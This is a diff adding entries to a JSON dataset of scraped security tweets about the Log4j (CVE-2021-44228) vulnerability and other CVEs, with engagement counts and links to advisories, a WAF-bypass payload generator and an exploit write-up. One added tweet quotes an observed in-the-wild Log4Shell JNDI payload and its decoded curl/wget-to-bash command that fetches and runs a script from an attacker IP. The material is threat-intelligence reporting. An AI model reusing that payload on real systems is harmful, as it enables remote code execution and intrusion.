@@ -223,6 +223,19 @@
 }
 {
     "expanded_url": [
+        "https://msft.it/6015ZJbYt"
+    ],
+    "tweetfavorites": 490,
+    "tweetquotes": 35,
+    "tweetreplies": 8,
+    "tweetretweets": 299,
+    "tweettext": "As we continue to monitor threats taking advantage of the CVE-2021-44228 Log4j 2 vulnerability, we’re seeing activity ranging from experimentation to exploitation from multiple groups, including nation-state actors and access brokers linked to ransomware: https://t.co/WWSxGvaiDy",
+    "tweettime": "2021-12-15, 03:33:12",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1470960102232444940",
+    "username": "MsftSecIntel"
+}
+{
+    "expanded_url": [
         "https://www.kb.cert.org/vuls/id/930724"
     ],
     "tweetfavorites": 82,
@@ -304,6 +317,19 @@
     "username": "ptswarm"
 }
 {
+    "expanded_url": [
+        "https://github.com/woodpecker-appstore/log4j-payload-generator"
+    ],
+    "tweetfavorites": 188,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 44,
+    "tweettext": "CVE-2021-44228 log4j2 Waf Bypass \nhttps://t.co/MUvFBTp41s https://t.co/81QMJDEglo",
+    "tweettime": "2021-12-14, 13:47:45",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1470752374306320393",
+    "username": "cyber_advising"
+}
+{
     "tweetfavorites": 102,
     "tweetquotes": 0,
     "tweetreplies": 10,
@@ -380,10 +406,10 @@
     "expanded_url": [
         "https://msft.it/6019ZENIW"
     ],
-    "tweetfavorites": 853,
+    "tweetfavorites": 837,
     "tweetquotes": 31,
     "tweetreplies": 10,
-    "tweetretweets": 475,
+    "tweetretweets": 467,
     "tweettext": "Microsoft is tracking threats taking advantage of the CVE-2021-44228 remote code execution (RCE) vulnerability in Apache Log4j 2 (\"Log4Shell\"). Get technical info and guidance for preventing, detecting, and hunting for related attacks: https://t.co/vOB7R1LXlj",
     "tweettime": "2021-12-12, 05:38:05",
     "tweeturl": "https://twitter.com/MsftSecIntel/status/1469904367281229824",
@@ -440,6 +466,16 @@
     "tweettime": "2021-12-10, 22:49:03",
     "tweeturl": "https://twitter.com/fastly/status/1469439041942786051",
     "username": "fastly"
+}
+{
+    "tweetfavorites": 100,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 41,
+    "tweettext": "Example CVE-2021-44228 payload:\n${jndi:ldap://80.71.158.12:5557/Basic/Command/Base64/KGN1cmwgLXMgODAuNzEuMTU4LjEyL2xoLnNofHx3Z2V0IC1xIC1PLSA4MC43MS4xNTguMTIvbGguc2gpfGJhc2g=}\n\nDecoded:\n(curl -s 80.71.158.12/lh.sh||wget -q -O- 80.71.158.12/lh.sh)|bash\n\nSource IP:\n62.76.41.46 (🇷🇺) https://t.co/LKdaZ9Lfos",
+    "tweettime": "2021-12-10, 20:47:14",
+    "tweeturl": "https://twitter.com/bad_packets/status/1469408389331488771",
+    "username": "bad_packets"
 }
 {
     "expanded_url": [
@@ -621,6 +657,19 @@
     "username": "artsploit"
 }
 {
+    "expanded_url": [
+        "https://github.com/advisories/GHSA-jfh8-c2jp-5v3q"
+    ],
+    "tweetfavorites": 463,
+    "tweetquotes": 38,
+    "tweetreplies": 9,
+    "tweetretweets": 218,
+    "tweettext": "Mass scanning activity detected from multiple hosts checking for servers using Apache Log4j (Java logging library) vulnerable to remote code execution (https://t.co/GgksMUlf94).\n\nQuery our API for \"tags=CVE-2021-44228\" for source IP addresses and other IOCs. #threatintel",
+    "tweettime": "2021-12-10, 08:39:03",
+    "tweeturl": "https://twitter.com/bad_packets/status/1469225135504650240",
+    "username": "bad_packets"
+}
+{
     "tweetfavorites": 46,
     "tweetquotes": 0,
     "tweetreplies": 2,
@@ -743,6 +792,19 @@
     "tweettime": "2021-12-06, 06:13:00",
     "tweeturl": "https://twitter.com/campuscodi/status/1467738826705674244",
     "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://syst3mfailure.io/sixpack-slab-out-of-bounds"
+    ],
+    "tweetfavorites": 92,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 31,
+    "tweettext": "[CVE-2021-42008] Exploiting A 16-Year-Old Vulnerability In The Linux 6pack Driver\nhttps://t.co/ZYTpajvWmB https://t.co/OMiTCnB5pH",
+    "tweettime": "2021-12-04, 20:37:08",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1467231518376538115",
+    "username": "cyber_advising"
 }
 {
     "expanded_url": [
